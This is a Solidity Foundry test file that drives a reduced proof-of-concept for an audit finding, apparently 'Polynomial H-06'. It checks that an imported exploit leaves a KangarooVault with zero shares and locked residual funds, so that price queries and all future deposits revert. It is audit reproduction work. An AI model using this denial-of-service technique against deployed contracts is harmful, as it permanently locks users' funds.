// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./20229-h-06-division-by-zero-error-causes-kangaroovault-to-be-dos-w.sol";

/// @dev forge-std driver for the reduced Polynomial H-06 PoC.
contract DivByZeroDoSTest is Test {
    Exploit exploit;

    function setUp() public {
        exploit = new Exploit();
    }

    function test_divByZeroBricksVault() public {
        exploit.run();

        KangarooVault vault = exploit.vault();
        MockERC20 susd = exploit.susd();
        uint256 residual = exploit.RESIDUAL();

        // Bad state reached: funds present, no shares.
        assertEq(vault.totalSupply(), 0, "supply should be zero");
        assertEq(vault.totalFunds(), residual, "residual should remain");
        assertEq(susd.balanceOf(address(vault)), residual, "residual should be held");

        // getTokenPrice reverts (division by zero panic).
        vm.expectRevert();
        vault.getTokenPrice();

        // Every future deposit reverts -> permanent DoS.
        vm.expectRevert();
        vault.initiateDeposit(address(0xBEEF), 1e18);

        // Residual is locked: still there, no shares to redeem it.
        assertEq(susd.balanceOf(address(vault)), residual, "residual must stay locked");
        assertEq(vault.totalSupply(), 0, "no shares to withdraw it");
    }
}
